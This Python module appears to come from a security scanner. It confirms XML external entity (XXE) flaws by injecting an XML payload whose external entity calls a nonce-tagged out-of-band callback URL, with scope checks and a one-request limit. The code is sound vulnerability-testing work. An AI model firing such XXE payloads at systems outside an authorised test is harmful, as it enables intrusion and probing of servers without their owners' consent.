"""XXE confirmation via out-of-band callback correlation.

The parameter value is replaced with an XML document whose external entity
points at a nonce-tagged callback URL. If the application parses the XML and
resolves external entities, it fetches the URL and the interaction carrying
our nonce confirms the vulnerability. Without a configured callback provider
the check fails closed as 'skipped'.
"""

import secrets

from autorecon.proofmodules.base import ProofModule


class XXE(ProofModule):
    name = 'xxe'
    check_name = 'xxe_oob'
    description = 'XML external entity (out-of-band callback correlation)'
    severity = 'critical'
    cwe = 'CWE-611'
    rationale = 'Probes only ask the XML parser to fetch a callback URL under our control; the callback server receives one request and no file content is exfiltrated.'
    max_requests = 1

    def verify(self, url, parameter, context):
        context.check_target(url, parameter)
        if context.callback is None:
            return self.finding('skipped', url, parameter, [],
                                allowed_origin=context.allowed_origin,
                                reason='no out-of-band callback configured')
        nonce = secrets.token_hex(8)
        callback = context.oob_url(nonce)
        entity = 'ar' + nonce
        payload = ('<?xml version="1.0"?>'
                   '<!DOCTYPE {e} [<!ENTITY {e} SYSTEM "{cb}">]>'
                   '<{e}>&{e};</{e}>').format(e=entity, cb=callback)
        status, body = context.probe(url, parameter, payload)
        evaluated = False
        interaction = context.oob_wait(nonce)
        if interaction is not None:
            evaluated = True
        return self.finding('confirmed' if evaluated else 'inconclusive',
                            url, parameter,
                            [self.probe_entry('probe-entity', status, payload, None, evaluated, body)],
                            allowed_origin=context.allowed_origin,
                            interaction={'protocol': interaction.get('protocol'),
                                         'remote-address': interaction.get('remote-address')} if interaction else None)
